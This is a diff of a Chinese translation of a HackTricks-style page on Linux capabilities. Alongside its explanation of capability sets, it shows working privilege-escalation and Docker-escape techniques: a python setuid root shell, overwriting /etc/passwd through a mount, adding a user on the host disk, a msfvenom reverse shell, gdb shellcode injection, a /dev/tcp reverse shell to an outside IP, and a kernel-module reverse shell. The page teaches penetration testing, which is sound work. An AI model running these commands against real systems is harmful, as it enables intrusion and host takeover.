@@ -2,64 +2,64 @@
 
 {{#include ../../banners/hacktricks-training.md}}
 
-Linux capabilities 将 **root 权限划分为更小且彼此独立的单元**，允许进程仅拥有部分权限。这样可以避免不必要地授予完整的 root 权限，从而降低风险。<sup>[[3]](#references)[[4]](#references)[[5]](#references)[[14]](#references)</sup>
+Linux capabilities 将 **root 权限划分为更小且彼此独立的单元**，使进程只能拥有部分权限。这样可以避免不必要地授予完整 root 权限，从而降低风险。<sup>[[3]](#references)[[4]](#references)[[5]](#references)[[14]](#references)</sup>
 
 ### 问题：
 
-- 普通用户对打开 raw sockets 或绑定 1024 以下 Internet 端口等操作的权限有限；capabilities 可以仅授予所需的操作，而不是完整的 root 权限。<sup>[[14]](#references)</sup>
+- 普通用户对打开 raw sockets 或绑定低于 1024 的 Internet 端口等操作的权限有限；capabilities 可以只授予所需的操作，而不是完整的 root 权限。<sup>[[14]](#references)</sup>
 
 ### Capability Sets：
 
-Linux 会为每个线程公开以下 capability sets，并在进程更改凭据或执行文件时由内核应用相应限制。<sup>[[14]](#references)</sup>
+Linux 为每个线程公开这些 capability sets，当进程更改凭据或执行文件时，kernel 会应用其中的限制。<sup>[[14]](#references)</sup>
 
 1. **Inherited (CapInh)**：
 
-- **用途**：当执行的文件具有匹配的 inheritable file capabilities 时，用于标识可能在 `execve()` 后加入 permitted set 的 capabilities。
+- **用途**：当执行的文件具有匹配的 inheritable file capabilities 时，标识在 `execve()` 后可能用于构成 permitted set 的 capabilities。
 - **功能**：线程的 inheritable set 会在 `execve()` 期间保留；它本身不会使这些 capabilities 生效。
 - **限制**：向此 set 添加 capability 会受到 permitted set 和 bounding set 的限制。<sup>[[14]](#references)</sup>
 
 2. **Effective (CapEff)**：
 
-- **用途**：表示进程当前实际使用的 capabilities。
-- **功能**：这是内核检查并据此授予各种操作权限的 capabilities set。对于文件而言，此 set 可以是一个标志，用于指示是否应将文件的 permitted capabilities 视为 effective。
-- **重要性**：effective set 对即时权限检查至关重要，作为进程可以使用的 active capabilities set。
+- **用途**：表示进程在任意时刻实际使用的 capabilities。
+- **功能**：这是 kernel 检查并据此授予各种操作权限的 capabilities set。对于文件，此 set 可以是一个标志，用于指示是否应将文件的 permitted capabilities 视为 effective。
+- **重要性**：effective set 对即时权限检查至关重要，充当进程可以使用的 active capabilities set。
 
 3. **Permitted (CapPrm)**：
 
 - **用途**：定义进程可以拥有的最大 capabilities set。
-- **功能**：进程可以将 capability 从 permitted set 提升到 effective set，从而获得使用该 capability 的能力。它也可以从 permitted set 中删除 capabilities。
-- **边界**：如果从此 set 中删除某个 capability，通常无法恢复，除非执行授予该 capability 的文件或进行其他特权转换。<sup>[[14]](#references)</sup>
+- **功能**：进程可以将某个 capability 从 permitted set 提升到 effective set，从而获得使用该 capability 的能力。它也可以从 permitted set 中删除 capabilities。
+- **边界**：如果某个 capability 从此 set 中删除，在通常情况下，除非执行授予该 capability 的文件或进行其他 privileged transition，否则无法恢复该 capability。<sup>[[14]](#references)</sup>
 
 4. **Bounding (CapBnd)**：
 
-- **用途**：限制进程在 `execve()` 期间从文件中获得的 capabilities，以及可以添加到其 inheritable set 中的 capabilities。
-- **功能**：此 set 会在 `fork()` 期间继承，并在 `execve()` 期间保留；当调用者拥有 `CAP_SETPCAP` 时，可以从中删除 capabilities。
-- **使用场景**：从此 set 中移除不必要的 capabilities，可以限制之后获取特权的能力。<sup>[[14]](#references)</sup>
+- **用途**：限制进程在 `execve()` 期间从文件中获得的 capabilities，以及进程可以添加到其 inheritable set 的 capabilities。
+- **功能**：该 set 会在 `fork()` 期间继承，并在 `execve()` 期间保留；当调用者拥有 `CAP_SETPCAP` 时，可以从中删除 capabilities。
+- **使用场景**：从此 set 中移除不必要的 capabilities，可以限制之后获取权限的能力。<sup>[[14]](#references)</sup>
 
 5. **Ambient (CapAmb)**：
-- **用途**：允许选定的 capabilities 在对非特权程序执行 `execve()` 后继续保留在 permitted 和 effective set 中。
-- **功能**：当执行的文件不是特权文件时，ambient capabilities 会被添加到新的 permitted 和 effective set 中。
-- **限制**：只有同时存在于 permitted 和 inheritable set 中时，某个 capability 才能成为 ambient；执行 set-user-ID/set-group-ID 文件或带有 capabilities 的文件会清除 ambient set。<sup>[[8]](#references)[[9]](#references)[[14]](#references)</sup>
+- **用途**：允许选定的 capabilities 在对非 privileged 程序执行 `execve()` 后继续保留在 permitted 和 effective sets 中。
+- **功能**：当执行的文件不是 privileged 文件时，ambient capabilities 会被添加到新的 permitted 和 effective sets 中。
+- **限制**：只有同时存在于 permitted 和 inheritable sets 中时，某个 capability 才能成为 ambient capability；执行 set-user-ID/set-group-ID 文件或带有 capabilities 的文件会清除 ambient set。<sup>[[8]](#references)[[9]](#references)[[14]](#references)</sup>
 
-## 进程与二进制文件 Capabilities
+## 进程与二进制文件的 Capabilities
 
 ### 进程 Capabilities
 
-要查看特定进程的 capabilities，请使用 /proc 目录中的 **status** 文件。由于该文件提供了更多详细信息，下面仅关注与 Linux capabilities 相关的信息。\
-请注意，对于所有正在运行的进程，capability 信息都是按线程维护的，而文件 capabilities 则存储在 `security.capability` 扩展属性中。<sup>[[14]](#references)[[15]](#references)</sup>
+要查看特定进程的 capabilities，请使用 /proc 目录中的 **status** 文件。由于其中包含更多详细信息，下面仅保留与 Linux capabilities 相关的信息。\
+请注意，对于所有正在运行的进程，capability 信息按线程维护，而文件 capabilities 存储在 `security.capability` extended attributes 中。<sup>[[14]](#references)[[15]](#references)</sup>
 
 你可以在 /usr/include/linux/capability.h 中找到定义的 capabilities。
 
-你可以通过 `cat /proc/self/status` 或 `capsh --print` 查看当前进程的 capabilities，也可以在 `/proc/<pid>/status` 中查看其他进程的 capabilities。<sup>[[15]](#references)[[26]](#references)</sup>
+你可以通过 `cat /proc/self/status` 或 `capsh --print` 查看当前进程的 capabilities，并通过 `/proc/<pid>/status` 查看其他进程的 capabilities。<sup>[[15]](#references)[[26]](#references)</sup>
 ```bash
 cat /proc/1234/status | grep Cap
 cat /proc/$$/status | grep Cap #This will print the capabilities of the current process
 ```
-在大多数系统上，此命令应返回五行 capability 信息。<sup>[[15]](#references)</sup>
+此命令在大多数系统上应返回五行 capability 信息。<sup>[[15]](#references)</sup>
 
-- CapInh = Inherited capabilities
-- CapPrm = Permitted capabilities
-- CapEff = Effective capabilities
+- CapInh = 继承的 capabilities
+- CapPrm = 允许的 capabilities
+- CapEff = 有效的 capabilities
 - CapBnd = Bounding set
 - CapAmb = Ambient capabilities set
 ```bash
@@ -87,11 +87,11 @@ CapAmb:    0000000000000000
 capsh --decode=0000000000003000
 0x0000000000003000=cap_net_admin,cap_net_raw
 ```
-虽然这种方法可行，但还有另一种更简单的方法。要查看正在运行的进程的 capabilities，请使用 **getpcaps** 工具并在其后指定进程 ID（PID）；它也接受进程 ID 列表。<sup>[[22]](#references)</sup>
+虽然这种方法可行，但还有另一种更简单的方法。要查看正在运行的进程的 capabilities，请使用 **getpcaps** 工具，后跟其进程 ID（PID）；它也接受进程 ID 列表。<sup>[[22]](#references)</sup>
 ```bash
 getpcaps 1234
 ```
-让我们在为二进制文件 `tcpdump` 授予 `cap_net_admin` 和 `cap_net_raw` 权限后，检查其抓取网络流量的能力（`tcpdump` 正在进程 9562 中运行）。<sup>[[22]](#references)[[25]](#references)</sup>
+让我们检查为 `tcpdump` 二进制文件授予 `cap_net_admin` 和 `cap_net_raw` 以嗅探网络后的 capabilities（`tcpdump` 正在进程 9562 中运行）。<sup>[[22]](#references)[[25]](#references)</sup>
 ```bash
 #The following command give tcpdump the needed capabilities to sniff traffic
 $ setcap cap_net_raw,cap_net_admin=eip /usr/sbin/tcpdump
@@ -109,30 +109,30 @@ CapAmb:    0000000000000000
 $ capsh --decode=0000000000003000
 0x0000000000003000=cap_net_admin,cap_net_raw
 ```
-如你所见，这些 capabilities 与通过两种方式检查进程所得的结果一致。`getpcaps` 工具使用 libcap 查询目标进程的 capabilities，并以文本形式将其打印出来；它接受一个或多个 PID。<sup>[[22]](#references)</sup>
+如你所见，这些 capabilities 与检查进程的两种方式所得的结果相对应。`getpcaps` 工具使用 libcap 查询目标进程的 capabilities，并以文本形式输出；它接受一个或多个 PID。<sup>[[22]](#references)</sup>
 
-### 二进制文件的 Capabilities
+### Binaries Capabilities
 
-二进制文件可以具有在执行期间应用的文件 capabilities。例如，`ping` 二进制文件可能携带 `cap_net_raw` capability。<sup>[[14]](#references)</sup>
+Binaries 可以拥有在执行期间应用的文件 capabilities。例如，`ping` binary 可能携带 `cap_net_raw` capability。<sup>[[14]](#references)</sup>
 ```bash
 getcap /usr/bin/ping
 /usr/bin/ping = cap_net_raw+ep
 ```
-你可以使用 `getcap -r` 搜索具有 capabilities 的二进制文件。<sup>[[23]](#references)</sup>
+你可以使用 `getcap -r`<sup>[[23]](#references)</sup>**搜索具有 capabilities 的 binaries**。
 ```bash
 getcap -r / 2>/dev/null
 ```
 ### 使用 capsh 丢弃 capabilities
 
-如果我们从当前的 bounding set 中丢弃 `CAP_NET_RAW`，需要该 capability 的程序应不再能够使用它。<sup>[[26]](#references)</sup>
+如果我们从当前的 bounding set 中移除 `CAP_NET_RAW`，需要该 capability 的程序应该就无法再使用它。<sup>[[26]](#references)</sup>
 ```bash
 capsh --drop=cap_net_raw --print -- -c "tcpdump"
 ```
-除了 _capsh_ 本身的输出外，_tcpdump_ 命令本身也应该引发错误。
+除了 _capsh_ 本身的输出之外，_tcpdump_ 命令本身也应该引发错误。
 
 > /bin/bash: /usr/sbin/tcpdump: Operation not permitted
 
-该错误表明，在从 bounding set 中移除 `CAP_NET_RAW` 后，`tcpdump` 无法使用请求的 file capability 执行。
+该错误表明，在从 bounding set 中移除 `CAP_NET_RAW` 后，`tcpdump` 无法使用请求的文件 capability 执行。
 
 ### 移除 Capabilities
 
@@ -140,9 +140,9 @@ capsh --drop=cap_net_raw --print -- -c "tcpdump"
 ```bash
 setcap -r </path/to/binary>
 ```
-## User Capabilities
+## 用户 Capabilities
 
-Linux 不会直接为登录用户分配文件 capabilities，但 `pam_cap` PAM module 可以使用 `/etc/security/capability.conf` 为已认证的会话设置可继承的 capabilities。<sup>[[16]](#references)</sup> 每个条目将以逗号分隔的 capability 名称或编号映射到一个或多个用户名。<sup>[[17]](#references)</sup>
+Linux 不会直接为登录用户分配文件 capabilities，但 `pam_cap` PAM module 可以使用 `/etc/security/capability.conf` 为已认证的会话设置可继承的 capabilities。<sup>[[16]](#references)</sup> 每个条目会将以逗号分隔的 capability 名称或编号映射到一个或多个用户名。<sup>[[17]](#references)</sup>
 文件示例：
 ```bash
 # Simple
@@ -157,9 +157,9 @@ cap_net_admin,cap_net_raw    jrnetadmin
 # Combining names and numerics
 cap_sys_admin,22,25          jrsysadmin
 ```
-## 环境能力
+## Environment Capabilities
 
-编译以下程序后，可以在提供 capabilities 的环境中 **spawn 一个 bash shell**。<sup>[[14]](#references)</sup>
+编译以下程序可以在**提供 capabilities 的环境中启动 bash shell**。<sup>[[14]](#references)</sup>
 ```c:ambient.c
 /*
 * Test program for the ambient capabilities
@@ -255,29 +255,29 @@ gcc -Wl,--no-as-needed -lcap-ng -o ambient ambient.c
 sudo setcap cap_setpcap,cap_net_raw,cap_net_admin,cap_sys_nice+eip ambient
 ./ambient /bin/bash
 ```
-在**由编译后的 ambient binary 执行的 bash**中，可以观察到**新的 capabilities**（普通用户在“current”部分不会拥有任何 capability）。<sup>[[14]](#references)</sup>
+在**编译的 ambient binary 所执行的 bash 中**，可以观察到**新的 capabilities**（普通用户在“current”部分不会拥有任何 capability）。<sup>[[14]](#references)</sup>
 ```bash
 capsh --print
 Current: = cap_net_admin,cap_net_raw,cap_sys_nice+eip
 ```
 > [!CAUTION]
-> 你**只能添加同时存在于 permitted 集合和 inheritable 集合中的 capabilities**。<sup>[[14]](#references)</sup>
+> 您**只能添加同时存在于 permitted 和 inheritable 集合中的 capabilities**。<sup>[[14]](#references)</sup>
 
-### Capability-aware/Capability-dumb 二进制文件
+### Capability-aware/Capability-dumb binaries
 
-Capability-dumb 二进制文件是带有文件 capabilities、但不使用 libcap 管理这些 capabilities 的程序。如果其 file effective 位已设置，kernel 会将文件的 permitted capabilities 启用到进程的 effective 集合中；如果进程未获得所有 permitted capabilities，执行可能会失败。<sup>[[14]](#references)</sup>
+Capability-dumb binary 是一种具有 file capabilities、但不使用 libcap 对其进行管理的程序。如果其 file effective 位已设置，kernel 会将该文件的 permitted capabilities 启用到进程的 effective 集合中；如果进程未获得所有 permitted capabilities，执行可能会失败。<sup>[[14]](#references)</sup>
 
-## Service Capabilities
+## 服务 Capabilities
 
-以 root 身份运行的系统 service 可能会保留广泛的 capabilities，除非其执行环境对这些 capabilities 进行了限制。在 systemd unit 中，`User=` 用于选择 service 用户，而 `AmbientCapabilities=` 会将指定的 capabilities 添加到所执行进程的 ambient 集合中。<sup>[[18]](#references)</sup>
+以 root 身份运行的系统服务可能会保留广泛的 capabilities，除非其执行环境对这些 capabilities 进行了限制。在 systemd unit 中，`User=` 选择服务用户，而 `AmbientCapabilities=` 将指定的 capabilities 添加到所执行进程的 ambient 集合中。<sup>[[18]](#references)</sup>
 ```bash
 [Service]
 User=bob
 AmbientCapabilities=CAP_NET_BIND_SERVICE
 ```
-## Docker 容器中的 Capabilities
+## Docker Containers 中的 Capabilities
 
-Docker 启动容器时会使用一组默认的 capability，这些 capability 可以通过 `--cap-add` 和 `--cap-drop` 进行更改；可以使用 `amicontained` 检查示例容器。<sup>[[19]](#references)[[24]](#references)</sup>
+Docker 启动容器时会使用默认的 capability 集合，可通过 `--cap-add` 和 `--cap-drop` 更改；可以使用 `amicontained` 检查示例容器。<sup>[[19]](#references)[[24]](#references)</sup>
 ```bash
 docker run --rm -it  r.j3ss.co/amicontained bash
 Capabilities:
@@ -292,11 +292,11 @@ docker run --rm -it --cap-add=ALL r.j3ss.co/amicontained bash
 # Remove all and add only one
 docker run --rm -it  --cap-drop=ALL --cap-add=SYS_PTRACE r.j3ss.co/amicontained bash
 ```
-## 提权/Container Escape
+## Privesc/Container Escape
 
-当你**希望在执行特权操作后限制自己的进程**时，Capabilities 很有用（例如设置 chroot 并绑定到 socket 后）。然而，通过向这些进程传递恶意命令或参数，可以利用它们，而这些命令或参数随后会以 root 身份运行。<sup>[[2]](#references)</sup>
+Capabilities 在你**希望在执行特权操作后限制自己的进程**时非常有用（例如设置 chroot 并绑定到 socket 后）。但是，通过向它们传递恶意命令或参数，可以利用它们运行 root 权限的操作。<sup>[[2]](#references)</sup>
 
-你可以使用 `setcap` 强制为程序设置 file capabilities，并使用 `getcap` 查询它们。<sup>[[23]](#references)[[25]](#references)</sup>
+你可以使用 `setcap` 为程序强制设置 file capabilities，并使用 `getcap` 查询它们。<sup>[[23]](#references)[[25]](#references)</sup>
 ```bash
 #Set Capability
 setcap cap_net_raw+ep /sbin/ping
@@ -305,7 +305,7 @@ setcap cap_net_raw+ep /sbin/ping
 getcap /sbin/ping
 /sbin/ping = cap_net_raw+ep
 ```
-对于文件 capability 文本，`+ep` 会将指定的 capability 提升到 effective 和 permitted 集合中；`-` 会降低选定的 flags。<sup>[[21]](#references)</sup>
+对于 file-capability 文本，`+ep` 会将指定的 capability 提升到 effective 和 permitted 集合中；`-` 会降低选定的标志位。<sup>[[21]](#references)</sup>
 
 要识别系统或文件夹中具有 capabilities 的程序，请使用 `getcap -r`。<sup>[[23]](#references)</sup>
 ```bash
@@ -321,7 +321,7 @@ setcap cap_setuid+ep /usr/bin/python2.7
 #Exploit
 /usr/bin/python2.7 -c 'import os; os.setuid(0); os.system("/bin/bash");'
 ```
-`tcpdump` **允许任何用户 sniff packets** 所需的 **Capabilities**：
+使 `tcpdump` **允许任何用户嗅探数据包**所需的 **Capabilities**：
 ```bash
 setcap cap_net_raw,cap_net_admin=eip /usr/sbin/tcpdump
 getcap /usr/sbin/tcpdump
@@ -329,24 +329,26 @@ getcap /usr/sbin/tcpdump
 ```
 ### “empty” capabilities 的特殊情况
 
-文件可以携带一个空的 capability 集合（`getcap myelf` 返回 `myelf =ep`）。空集合不会授予任何 capability；当它与 root-owned 的 set-user-ID 位结合时，程序仍然可以将执行进程的 effective ID 和 saved ID 更改为 0，而无需获得 file capabilities。一个 unowned、非 SUID/SGID 且带有 `=ep` 的文件不会以 root 身份运行。<sup>[[14]](#references)</sup>
+文件可以携带一个空的 capability 集合（`getcap myelf` 返回 `myelf =ep`）。空集合不会授予任何 capabilities；当它与 root-owned 的 set-user-ID bit 结合时，程序仍然可以将执行进程的 effective ID 和 saved ID 更改为 0，而不会获得 file capabilities。一个 unowned、非 SUID/SGID 且带有 `=ep` 的文件不会以 root 身份运行。<sup>[[14]](#references)</sup>
 
 ## CAP_SYS_ADMIN
 
-**[`CAP_SYS_ADMIN`](https://man7.org/linux/man-pages/man7/capabilities.7.html)** 是一种权限非常强大的 Linux capability，由于其广泛的 **administrative privileges**，通常被认为接近 root 级别，例如挂载设备或操纵 kernel 功能。虽然它对于模拟完整系统的容器不可或缺，但 **`CAP_SYS_ADMIN` 会带来重大的安全挑战**，尤其是在容器化环境中，因为它可能导致 privilege escalation 和 system compromise。因此，应对其使用进行严格的安全评估和谨慎管理，并强烈建议在特定于应用的容器中删除此 capability，以遵循 **principle of least privilege** 并最大限度地减少 attack surface。<sup>[[14]](#references)</sup>
+**[`CAP_SYS_ADMIN`](https://man7.org/linux/man-pages/man7/capabilities.7.html)** 是一种非常强大的 Linux capability，因其广泛的 **administrative privileges**（例如挂载设备或操纵 kernel features），通常被视为接近 root 级别的权限。虽然它对于模拟完整系统的 containers 不可或缺，但 **`CAP_SYS_ADMIN` 会带来重大的 security challenges**，尤其是在 containerized environments 中，因为它可能导致 privilege escalation 和 system compromise。因此，应对其使用进行严格的 security assessments 并谨慎管理；对于 application-specific containers，强烈建议移除此 capability，以遵循 **principle of least privilege** 并最小化 attack surface。<sup>[[14]](#references)</sup>
+
+对于 namespace pivots，作用域很重要：`setns()` 会针对拥有目标的 user namespace 检查 `CAP_SYS_ADMIN`。进入 mount namespace 还要求调用者的 user namespace 中具有 `CAP_SYS_CHROOT`。因此，仅在 private remapped user namespace 中持有的 capability，并不能授予任意进入 initial host namespaces 的权限。<sup>[[14]](#references)</sup>
 
 **使用 binary 的示例**
 ```bash
 getcap -r / 2>/dev/null
 /usr/bin/python2.7 = cap_sys_admin+ep
 ```
-使用 Python，你可以将修改后的 _passwd_ 文件挂载到真实的 _passwd_ 文件之上：
+使用 Python 可以将修改后的 _passwd_ 文件挂载到真实 _passwd_ 文件之上：
 ```bash
 cp /etc/passwd ./ #Create a copy of the passwd file
 openssl passwd -1 -salt abc password #Get hash of "password"
 vim ./passwd #Change roots passwords of the fake passwd file
 ```
-最后，将修改后的 `passwd` 文件 **mount** 到 `/etc/passwd`：
+最后将修改后的 `passwd` 文件 **mount** 到 `/etc/passwd`：
 ```python
 from ctypes import *
 libc = CDLL("libc.so.6")
@@ -359,11 +361,11 @@ options = b"rw"
 mountflags = MS_BIND
 libc.mount(source, target, filesystemtype, mountflags, options)
 ```
-并且你将能够使用密码“password”以 **`su` as root**。
+并且你将能够使用密码 "password" **`su` 为 root**。
 
-**带环境的示例（Docker breakout）**
+**环境示例（Docker breakout）**
 
-你可以使用以下命令检查 Docker container 中已启用的 capabilities：
+你可以使用以下命令检查 docker container 内启用的 capabilities：
 ```
 capsh --print
 Current: = cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read+ep
@@ -380,40 +382,39 @@ groups=0(root)
 
 - **Mount**
 
-在具备适当的 device 和 namespace 访问权限时，这可以允许 Docker container **挂载 host 磁盘并访问其内容**。<sup>[[14]](#references)</sup>
+具备适当的 device 和 namespace 访问权限后，这可以让 Docker container **挂载 host 磁盘并访问其内容**。该 device node 必须代表真实的 host device，device cgroup 必须允许此操作，并且挂载基于 block 的 filesystem 需要在 initial user namespace 中具备 `CAP_SYS_ADMIN`。<sup>[[14]](#references)</sup>
 ```bash
-fdisk -l #Get disk name
-Disk /dev/sda: 4 GiB, 4294967296 bytes, 8388608 sectors
-Units: sectors of 1 * 512 = 512 bytes
-Sector size (logical/physical): 512 bytes / 512 bytes
-I/O size (minimum/optimal): 512 bytes / 512 bytes
-
-mount /dev/sda /mnt/ #Mount it
-cd /mnt
-chroot ./ bash #You have a shell inside the docker hosts disk
+lsblk -o NAME,PATH,TYPE,SIZE,FSTYPE,MOUNTPOINTS
+node_root_device=/dev/sda1 # Replace with the validated filesystem partition or LV.
+mkdir -p /mnt/host
+mount -o ro "${node_root_device}" /mnt/host
+cat /mnt/host/etc/hostname
+umount /mnt/host
 ```
 - **完全访问权限**
 
 在前一种方法中，我们成功访问了主机磁盘。\
-如果主机正在运行 **ssh** 服务器，你可以**在已挂载的磁盘中创建一个用户**，然后通过 SSH 访问它。<sup>[[14]](#references)</sup>
+如果主机运行着 **ssh** 服务器，你可以**在已挂载的磁盘中创建一个用户**，然后通过 SSH 访问它。<sup>[[14]](#references)</sup>
 ```bash
 #Like in the example before, the first step is to mount the docker host disk
-fdisk -l
-mount /dev/sda /mnt/
+node_root_device=/dev/sda1
+mount "${node_root_device}" /mnt/host
 
 #Then, search for open ports inside the docker host
 nc -v -n -w2 -z 172.17.0.1 1-65535
 (UNKNOWN) [172.17.0.1] 2222 (?) open
 
 #Finally, create a new user inside the docker host and use it to access via SSH
-chroot /mnt/ adduser john
+chroot /mnt/host adduser john
 ssh john@172.17.0.1 -p 2222
 ```
+直接读取和写入 `/mnt/host` 已经属于对 host filesystem 的访问。最后的 `chroot` 仅是路径名便利操作，并且还需要 `CAP_SYS_CHROOT`；它并不是创建逃逸的步骤。
+
 ## CAP_SYS_PTRACE
 
-使用 `CAP_SYS_PTRACE` 时，进程可以跟踪和检查其 PID namespace 中可见的其他进程。若要从 Docker container 中 targeting host processes，请使用 `--pid=host` 共享 host PID namespace（或加入包含目标进程的 namespace）。<sup>[[14]](#references)[[20]](#references)</sup>
+借助 `CAP_SYS_PTRACE`，进程可以跟踪和检查其 PID namespace 中可见的其他进程。若要从 Docker container  targeting host processes，请使用 `--pid=host` 共享 host PID namespace（或加入包含目标进程的 namespace）。<sup>[[14]](#references)[[20]](#references)</sup>
 
-**[`CAP_SYS_PTRACE`](https://man7.org/linux/man-pages/man7/capabilities.7.html)** 授予使用 `ptrace(2)` 提供的 debugging 和 system call tracing 功能，以及 `process_vm_readv(2)` 和 `process_vm_writev(2)` 等 cross-memory attach 调用的能力。尽管它对于诊断和 monitoring 非常强大，但如果启用 `CAP_SYS_PTRACE` 时没有对 `ptrace(2)` 施加 seccomp filter 等限制措施，可能会严重削弱系统安全性。具体而言，它可以被利用来绕过其他安全限制，尤其是 seccomp 施加的限制，[如这个 proof of concept (PoC)](https://gist.github.com/thejh/8346f47e359adecd1d53) 所示。<sup>[[10]](#references)</sup>
+**[`CAP_SYS_PTRACE`](https://man7.org/linux/man-pages/man7/capabilities.7.html)** 授予使用 `ptrace(2)` 提供的 debugging 和 system call tracing 功能，以及 `process_vm_readv(2)` 和 `process_vm_writev(2)` 等 cross-memory attach 调用的能力。尽管它对于 diagnostic 和 monitoring 非常强大，但如果启用 `CAP_SYS_PTRACE` 时没有采取 restrictive measures，例如针对 `ptrace(2)` 的 seccomp filter，就可能严重削弱系统安全性。具体而言，它可被利用来绕过其他安全限制，尤其是 seccomp 施加的限制，[如这个 proof of concept (PoC) 所示](https://gist.github.com/thejh/8346f47e359adecd1d53)。<sup>[[10]](#references)</sup>
 
 **使用 binary (python) 的示例**
 ```bash
@@ -513,7 +514,7 @@ libc.ptrace(PTRACE_DETACH, pid, None, None)
 ```
 /usr/bin/gdb = cap_sys_ptrace+ep
 ```
-使用 msfvenom 创建 shellcode，并通过 gdb 注入内存
+使用 msfvenom 创建 shellcode，通过 gdb 注入内存
 ```python
 # msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.11 LPORT=9001 -f py -o revshell.py
 buf =  b""
@@ -560,21 +561,21 @@ Continuing.
 process 207009 is executing new program: /usr/bin/dash
 [...]
 ```
-**环境示例（Docker breakout）- 另一个 gdb Abuse**
+**环境示例（Docker breakout）- Another gdb Abuse**
 
-如果已安装 **GDB**（或者例如可以使用 `apk add gdb` 或 `apt install gdb` 进行安装），你可以**从 host 调试一个进程**，并让它调用 `system` 函数。（此技术还需要 capability `SYS_ADMIN`）**。**
+如果已安装 **GDB**（或者例如可以使用 `apk add gdb` 或 `apt install gdb` 进行安装），就可以 **debug 一个可见的主机进程**，并使其调用 `system` 函数。这需要目标 user namespace 中具备有效的 `CAP_SYS_PTRACE`，以及主机 PID 可见性；不需要 `CAP_SYS_ADMIN`。不过，Yama、non-dumpable 状态、seccomp 和 LSM policy 仍可能阻止 attach。
 ```bash
 gdb -p 1234
 (gdb) call (void)system("ls")
 (gdb) call (void)system("sleep 5")
 (gdb) call (void)system("bash -c 'bash -i >& /dev/tcp/192.168.115.135/5656 0>&1'")
 ```
-你将无法看到所执行命令的输出，但该命令会由该进程执行（因此获取一个 rev shell）。
+你将无法看到所执行命令的输出，但该命令会由该进程执行（因此可以获取一个 rev shell）。
 
 > [!WARNING]
-> 如果出现错误 "No symbol "system" in current context."，请检查前一个示例，该示例演示了如何通过 gdb 在程序中加载 shellcode。
+> 如果遇到错误 `"No symbol "system" in current context."`，请查看之前通过 gdb 在程序中加载 shellcode 的示例。
 
-**Example with environment (Docker breakout) - Shellcode Injection**
+**环境示例（Docker breakout）- Shellcode Injection**
 
 你可以使用以下命令检查 Docker 容器内启用的 capabilities：
 ```bash
@@ -589,33 +590,33 @@ uid=0(root)
 gid=0(root)
 groups=0(root
 ```
-列出运行在**主机**中的**进程**：`ps -eaf`
+列出 **host** 中运行的 **processes**：`ps -eaf`
 
-1. 获取**架构**：`uname -m`
-2. 为该架构查找一段**shellcode**（[https://www.exploit-db.com/exploits/41128](https://www.exploit-db.com/exploits/41128)）
-3. 查找一个可将**shellcode** **注入**进程内存的**程序**（[https://github.com/0x00pf/0x00sec_code/blob/master/mem_inject/infect.c](https://github.com/0x00pf/0x00sec_code/blob/master/mem_inject/infect.c)）
-4. 在程序中**修改** **shellcode**，然后进行**编译**：`gcc inject.c -o inject`
-5. **注入**并获取你的**shell**：`./inject 299; nc 172.17.0.1 5600`
+1. 获取 **architecture**：`uname -m`
+2. 为该 architecture 查找 **shellcode**（[https://www.exploit-db.com/exploits/41128](https://www.exploit-db.com/exploits/41128)）
+3. 查找一个将 **shellcode** **inject** 到进程内存中的 **program**（[https://github.com/0x00pf/0x00sec_code/blob/master/mem_inject/infect.c](https://github.com/0x00pf/0x00sec_code/blob/master/mem_inject/infect.c)）
+4. 在 program 中 **modify** **shellcode** 并对其进行 **compile**：`gcc inject.c -o inject`
+5. 执行 **inject** 并获取你的 **shell**：`./inject 299; nc 172.17.0.1 5600`
 
 ## CAP_SYS_MODULE
 
-**[`CAP_SYS_MODULE`](https://man7.org/linux/man-pages/man7/capabilities.7.html)** 允许进程**加载和卸载 kernel modules（`init_module(2)`、`finit_module(2)` 和 `delete_module(2)` system calls）**，从而直接访问 kernel 的核心操作。此 capability 会带来严重的 security risks，因为加载 module 可以修改 kernel 的行为，并可能突破 isolation boundaries。<sup>[[6]](#references)[[14]](#references)</sup>
-**这允许在对进程可见的 kernel 中插入或移除 modules；在 container 中，是否会影响 host kernel 取决于 isolation configuration**。<sup>[[14]](#references)</sup>
+**[`CAP_SYS_MODULE`](https://man7.org/linux/man-pages/man7/capabilities.7.html)** 赋予 process **load and unload kernel modules (`init_module(2)`、`finit_module(2)` 和 `delete_module(2)` system calls)** 的权限，从而可以直接访问 kernel 的核心操作。由于加载 module 可能修改 kernel 行为并突破隔离边界，此 capability 会带来严重的 security risks。<sup>[[6]](#references)[[14]](#references)</sup>
+在普通的 rootful Linux container 中，该操作针对的是**共享的 host kernel**，因此可直接实现 breakout。该 capability 必须在 initial user namespace 中生效，因为 module loading 不受 namespace 隔离。gVisor、Kata 或 Hyper-V 等 userspace-kernel 或 VM-isolated runtime 会改变可触及的 kernel boundary。`modules_disabled`、kernel lockdown、signature enforcement、seccomp 或 LSM 仍可能阻止 module loading。<sup>[[14]](#references)</sup>
 
 **使用 binary 的示例**
 
-在以下示例中，**`python`** binary 具备此 capability。
+在以下示例中，binary **`python`** 具有此 capability。
 ```bash
 getcap -r / 2>/dev/null
 /usr/bin/python2.7 = cap_sys_module+ep
 ```
-默认情况下，**`modprobe`** command 会在目录 **`/lib/modules/$(uname -r)`** 中检查 dependency list 和 map files。\
+默认情况下，**`modprobe`** 命令会在目录 **`/lib/modules/$(uname -r)`** 中检查依赖项列表和映射文件。\
 为了利用这一点，我们创建一个伪造的 **lib/modules** 文件夹：
 ```bash
 mkdir lib/modules -p
 cp -a /lib/modules/5.0.0-20-generic/ lib/modules/$(uname -r)
 ```
-然后 **编译下面 2 个示例中的内核模块，并将其复制** 到此文件夹：
+然后**编译下面 2 个示例中找到的 kernel module，并将其复制**到此文件夹：
 ```bash
 cp reverse-shell.ko lib/modules/$(uname -r)/
 ```
@@ -633,11 +634,11 @@ km.modprobe("reverse-shell")
 getcap -r / 2>/dev/null
 /bin/kmod = cap_sys_module+ep
 ```
